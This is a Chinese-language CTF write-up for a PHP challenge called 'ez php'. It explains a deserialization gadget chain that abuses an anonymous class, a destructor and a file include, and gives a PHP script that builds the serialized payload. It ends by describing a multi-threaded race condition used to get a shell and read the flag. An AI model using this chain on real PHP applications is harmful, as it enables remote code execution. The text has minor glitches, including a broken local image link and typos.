---
tags: [PHP反序列化, 匿名类, 析构函数利用, 条件竞争, 文件包含, RCE]
---

# ez php

base64解开之后只有一个类test ，然后在test类的构造函数里会创建一个匿名类 ，并把这个匿名类绑在readflag变量上。 匿名类的构造函数负责上传一个文件 ，readflag函数负责创建一个全局的readflag函数 ，用于执行代码。不得不吐槽这代码实在太抽象 ，好几次都被绕晕。

test类的析构函数可以 ，无参数new一个类 ，无参数调用一个函数。

那么基本的思路如下：

\1.  首先触发new那个匿名类 ，然后让new出来的匿名类绑定在readflag属性上。这样需要使用无参数调用一个test实例的__construct函数 ，才能把readflag属性保留下来。在new匿名类的同时会触发文件上传。

\2.  然后获取test实例的readflag属性 ，调用[$test->readflag,"readlag"] ，触发匿名类的readflag方法 ，让其在全局注册一个readflag函数。

\3.  调用全局的readflag函数 ，触发包含。

要实现上述过程要准备三个test实例。3号析构时调用[&$test1, '__construct'] ，2号析构时调用 &$test1->readflag,![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml176184\wps3.jpg)'readflag'] ，1号析构时调用 "readflag"。

```
1  <?php
2   include '1.php';
3   $test1 = new test();
4   $test2 = new test();
5   $test3 = new test(); 6
7   $test1->key = 'func';
8  $test1->f = "readflag";
9   $test1->readflag = "0"; 10
11   $test2->key = 'func';
12   $test2->f = [&$test1->readflag, 'readflag'];
13   $test2->readflag = "0"; 14
15   $test3->key = 'func';
16  $test3->readflag = "0";
17   $test3->f = [&$test1, '__construct']; 18
19  echo serialize([$test3, $test2, $test1]);
20  echo "======prepare to destruct======\n";
```

最后需要绕一个readflag里的正则'/<\? \:\/\/|ph \?\=/i' ，但是没绕过去哈哈：）。

后来发现上传文件时 ，会清空上传目录里的所有文件 ，且同一分钟内上传的文件名不变。而文件检测是先读取文件内容进行检测 ，再include包含。直接10个线程开始竞争！shell之后 ，用base64

getflag。